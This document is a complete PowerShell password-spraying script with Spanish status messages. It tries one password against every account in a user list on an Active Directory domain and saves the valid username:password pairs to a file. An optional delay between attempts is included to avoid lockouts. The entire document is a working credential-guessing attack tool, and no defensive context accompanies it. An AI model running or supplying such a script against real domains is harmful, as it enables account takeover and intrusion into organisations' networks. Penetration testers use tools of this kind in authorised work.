# PasswordSpray.ps1
param(
    [Parameter(Mandatory=$true)]
    [string]$Domain,
    
    [Parameter(Mandatory=$true)]
    [string]$UserList,
    
    [Parameter(Mandatory=$true)]
    [string]$Password,
    
    [int]$Delay = 0
)

function Test-ADCredential {
    param($Username, $Password, $Domain)
    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain', $Domain)
    
    try {
        $result = $DS.ValidateCredentials($Username, $Password)
        return $result
    }
    catch {
        return $false
    }
}

Write-Host "[*] Iniciando Password Spraying contra $Domain" -ForegroundColor Cyan
Write-Host "[*] Password a probar: $Password" -ForegroundColor Yellow

$users = Get-Content $UserList
$validCreds = @()

foreach ($user in $users) {
    Write-Host "[*] Probando: $user" -NoNewline
    
    if (Test-ADCredential -Username $user -Password $Password -Domain $Domain) {
        Write-Host " [SUCCESS]" -ForegroundColor Green
        $validCreds += "$user:$Password"
    }
    else {
        Write-Host " [FAIL]" -ForegroundColor Red
    }
    
    if ($Delay -gt 0) {
        Start-Sleep -Seconds $Delay
    }
}

Write-Host "`n[+] Credenciales v√°lidas encontradas:" -ForegroundColor Green
$validCreds | ForEach-Object { Write-Host $_ -ForegroundColor Green }

# Guardar resultados
$validCreds | Out-File -FilePath "valid_creds.txt" -Encoding UTF8
Write-Host "`n[*] Resultados guardados en valid_creds.txt"
